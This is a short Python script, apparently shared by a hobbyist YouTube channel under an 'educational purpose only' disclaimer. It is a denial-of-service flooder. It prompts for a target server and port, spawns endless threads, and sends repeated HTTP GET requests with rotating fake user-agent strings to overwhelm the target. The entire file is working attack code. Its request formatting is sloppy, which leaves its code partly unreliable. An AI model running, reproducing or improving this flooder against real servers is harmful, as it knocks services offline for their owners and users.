import os
import sys
import socket
import random
import threading


"""
Educational purpose only             
I'm not responsible for your actions 
-----------------------------------------------------
Created By: TheTechHacker
SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ
"""

if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")
elif sys.platform == "darwin":
    os.system("clear")
else:
    print("Unknown System Detected")


user_server = raw_input("\033[1;32m SERVER: \033[1;m")
user_port = input("\033[1;32m PORT: \033[1;m")
agent = []
count = 0


def user_agent():
    global agent
    agent.append("Mozilla/5.0 (Linux; Android 7.0; SM-G892A BuVersion/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36")
    agent.append("Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 ( like Gecko)")
    agent.append("Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) 4.0 Mobile Safari/533.1")
    agent.append("Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)")
    agent.append("Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)")
    agent.append("Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0;")
    return agent


class Socks(threading.Thread):
    def run(self):
        global user_server, user_port, count
        while True:
            try:
                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                packet = "GET / HTTP/1.1\n Host: " + user_server + "\n\n User-Agent:" + random.choice(user_agent())
                soc.connect((user_server, int(user_port)))
                soc.sendto(packet, (user_server, int(user_port)))
                count += 1
                print ("\033[1;32m Tcp send \033[1;m {0}".format(count))
            except KeyboardInterrupt:
                exit("\033[1;32m [-]Canceled By User \033[1;m")
                break
            except socket.error:
                print ("\033[1;32m Connection Error Server Might be Down \033[1;32m")
                pass


while True:
    try:
        th1 = Socks()
        th1.start()
    except KeyboardInterrupt:
        exit("\033[1;32m [-]Canceled By User \033[1;m")
        break
